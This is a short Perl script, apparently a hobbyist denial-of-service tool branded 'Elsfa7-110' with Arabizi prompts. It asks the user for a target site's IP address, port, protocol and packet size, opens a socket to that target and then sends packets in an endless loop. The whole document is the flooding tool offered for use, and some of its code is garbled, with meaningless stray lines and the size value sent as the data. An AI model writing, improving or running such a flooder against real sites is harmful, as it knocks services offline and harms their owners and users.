#!/usr/bin/perl

print q{
  _____   _          __           _____           _   _    ___   
 | ____| | |  ___   / _|   __ _  |___  |         / | / |  / _ \  
 |  _|   | | / __| | |_   / _` |    / /   _____  | | | | | | | | 
 | |___  | | \__ \ |  _| | (_| |   / /   |_____| | | | | | |_| | 
 |_____| |_| |___/ |_|    \__,_|  /_/            |_| |_|  \___/  

                          +++Pri8Ghost+++

pra7a 3la moak3 elns y3ars hh
};

use IO::Socket::INET;
print "7ot hna ip elmok3 : --> ";
chop ($host = <stdin>);
print "hna aktp elport 80 msln : -> ";
chop ($port = <stdin>);
print "protocol TCP / UDP: -> ";
chop ($protocol = <stdin>);
print "Size: -> ";
chop ($size = <stdin>);
{
$sock = IO::Socket::INET->new (
  PeerAddr => $host,
  PeerPort => $port,
  Proto => $protocol) 
        || die "bksmk anta katp port aw ip aw protcol 8lt";
}
packets:
while (1) {
size => $size;
$Reuse => 1,
$Listen => 1,
print ("$host:$port By Elsfa7-110 packet size: $size\n");
send($sock, $size, $Reuse, $Listen);
} 
